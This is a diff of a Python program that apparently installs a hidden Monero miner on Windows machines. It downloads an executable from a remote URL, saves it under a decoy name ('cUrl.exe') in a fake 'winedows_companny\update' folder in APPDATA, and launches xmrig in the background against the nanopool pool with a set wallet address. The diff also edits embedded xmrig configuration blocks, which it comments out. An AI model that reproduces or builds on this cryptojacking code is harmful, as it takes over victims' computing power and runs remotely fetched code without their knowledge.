@@ -621,7 +621,7 @@ if yes == "yes":
 				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(XMRIGPATH)
+		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --cpu-max-threads-hint=30 --background')
 
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
@@ -662,97 +662,325 @@ if yes == "yes":
 						f.write(r.content)
 					with zipfile.ZipFile(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'r') as zip_ref:
 						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
+					"""
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\config.json", "x").write('''
 {
-    "algo": "cryptonight",
+    "algo":"cn/r",
     "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
         "port": 0,
         "access-token": null,
-        "worker-id": null,
-        "ipv6": false,
         "restricted": true
     },
-    "av": 0,
-    "background": true,
+    "autosave": true,
+    "background": false,
     "colors": true,
-    "cpu-affinity": null,
-    "cpu-priority": null,
-    "donate-level": 5,
-    "huge-pages": true,
-    "hw-aes": null,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "init-avx2": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
+        "cn": [
+            [1, 0],
+            [1, 2],
+            [1, 4],
+            [1, 6]
+        ],
+        "cn-heavy": [
+            [1, 0],
+            [1, 2]
+        ],
+        "cn-lite": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3],
+            [1, 4],
+            [1, 5],
+            [1, 6],
+            [1, 7]
+        ],
+        "cn-pico": [
+            [2, 0],
+            [2, 1],
+            [2, 2],
+            [2, 3],
+            [2, 4],
+            [2, 5],
+            [2, 6],
+            [2, 7]
+        ],
+        "cn/upx2": [
+            [2, 0],
+            [2, 1],
+            [2, 2],
+            [2, 3],
+            [2, 4],
+            [2, 5],
+            [2, 6],
+            [2, 7]
+        ],
+        "ghostrider": [
+            [8, 0],
+            [8, 2],
+            [8, 4],
+            [8, 6]
+        ],
+        "rx": [0, 2, 4, 6],
+        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],
+        "cn-lite/0": false,
+        "cn/0": false,
+        "rx/arq": "rx/wow",
+        "rx/keva": "rx/wow"
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "adl": true
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true
+    },
     "log-file": null,
-    "max-cpu-usage": 25,
+    "donate-level": 2,
+    "donate-over-proxy": 1,
     "pools": [
         {
+            "algo": null,
+            "coin": null,
             "url": "xmr-eu1.nanopool.org:14444",
             "user": "'''+ ADDRESS + '''",
-            "pass": "0xSxZ",
-            "keepalive": true,
+            "pass": "x",
+            "rig-id": null,
             "nicehash": false,
-            "variant": -1,
+            "keepalive": true,
+            "enabled": true,
             "tls": false,
-            "tls-fingerprint": null
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
         }
     ],
-    "print-time": 60,
     "retries": 5,
     "retry-pause": 5,
-    "safe": false,
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
     "syslog": false,
-    "threads": null
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
 }
 
 
-
 					''')
+				"""
 				else:
 					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe"
 					r = requests.get(MINERURL)
 					with open(XMRIGPATH, 'wb') as f:
 						print("Writing..")
 						f.write(r.content)
+					"""
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
 {
-    "algo": "cryptonight",
+    "algo":"cn/r",
     "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
         "port": 0,
         "access-token": null,
-        "worker-id": null,
-        "ipv6": false,
         "restricted": true
     },
-    "av": 0,
-    "background": true,
+    "autosave": true,
+    "background": false,
     "colors": true,
-    "cpu-affinity": null,
-    "cpu-priority": null,
-    "donate-level": 5,
-    "huge-pages": true,
-    "hw-aes": null,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "init-avx2": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
+        "cn": [
+            [1, 0],
+            [1, 2],
+            [1, 4],
+            [1, 6]
+        ],
+        "cn-heavy": [
+            [1, 0],
+            [1, 2]
+        ],
+        "cn-lite": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3],
+            [1, 4],
+            [1, 5],
+            [1, 6],
+            [1, 7]
+        ],
+        "cn-pico": [
+            [2, 0],
+            [2, 1],
+            [2, 2],
+            [2, 3],
+            [2, 4],
+            [2, 5],
+            [2, 6],
+            [2, 7]
+        ],
+        "cn/upx2": [
+            [2, 0],
+            [2, 1],
+            [2, 2],
+            [2, 3],
+            [2, 4],
+            [2, 5],
+            [2, 6],
+            [2, 7]
+        ],
+        "ghostrider": [
+            [8, 0],
+            [8, 2],
+            [8, 4],
+            [8, 6]
+        ],
+        "rx": [0, 2, 4, 6],
+        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],
+        "cn-lite/0": false,
+        "cn/0": false,
+        "rx/arq": "rx/wow",
+        "rx/keva": "rx/wow"
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "adl": true
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true
+    },
     "log-file": null,
-    "max-cpu-usage": 25,
+    "donate-level": 2,
+    "donate-over-proxy": 1,
     "pools": [
         {
+            "algo": null,
+            "coin": null,
             "url": "xmr-eu1.nanopool.org:14444",
             "user": "'''+ ADDRESS + '''",
-            "pass": "0xSxZ",
-            "keepalive": true,
+            "pass": "x",
+            "rig-id": null,
             "nicehash": false,
-            "variant": -1,
+            "keepalive": true,
+            "enabled": true,
             "tls": false,
-            "tls-fingerprint": null
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
         }
     ],
-    "print-time": 60,
     "retries": 5,
     "retry-pause": 5,
-    "safe": false,
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
     "syslog": false,
-    "threads": null
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false,
+    "pause-on-active": false
 }
 
-
-					''')
+			''')
+			"""
 			except Exception as e:
 				print(e)
 			if MINE == True and checkIfProcessRunning("xmrig") == False:
